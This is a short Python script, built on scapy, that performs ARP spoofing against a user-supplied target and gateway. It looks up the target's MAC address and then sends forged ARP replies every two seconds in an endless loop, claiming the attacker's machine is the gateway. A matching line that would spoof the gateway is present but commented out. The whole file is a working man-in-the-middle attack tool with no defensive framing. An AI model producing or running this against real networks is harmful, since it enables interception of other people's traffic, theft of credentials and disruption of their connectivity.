import scapy.all as scapy
import time

target_ip = input("Target IP: ")
gateway_ip = input("Gateway IP: ")


def get_mac(ip):
    request = scapy.ARP(pdst=ip)
    response = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / request, timeout=1, verbose=False)[0]
    return response[0][1].hwsrc


while True:
    # Tell target that we are the gateway
    scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=gateway_ip), verbose=False)

    # # Tell gateway that we are the target
    # scapy.send(scapy.ARP(op=2, pdst=gateway_ip, hwdst=get_mac(gateway_ip), psrc=target_ip), verbose=False)

    print("Spoofed")
    time.sleep(2)